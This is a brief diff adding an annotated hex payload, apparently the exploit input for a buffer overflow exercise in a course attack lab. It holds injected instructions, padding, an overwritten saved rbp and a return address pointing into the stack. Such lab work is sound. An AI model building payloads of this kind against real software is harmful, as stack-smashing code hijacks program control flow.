@@ -1,0 +1,13 @@
+/* bad asm code */
+/* movl $0x2e561bea, %eax */
+b8 ea 1b 56 2e
+/* mov %eax, -4(%rbp) */
+89 45 fc
+/* jmp 0x4011d0 */
+e9 13 d8 d7 aa
+/* complete the string */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* rbp */
+d0 39 68 55 00 00 00 00
+/* ret add */
+b0 39 68 55 00 00 00 00
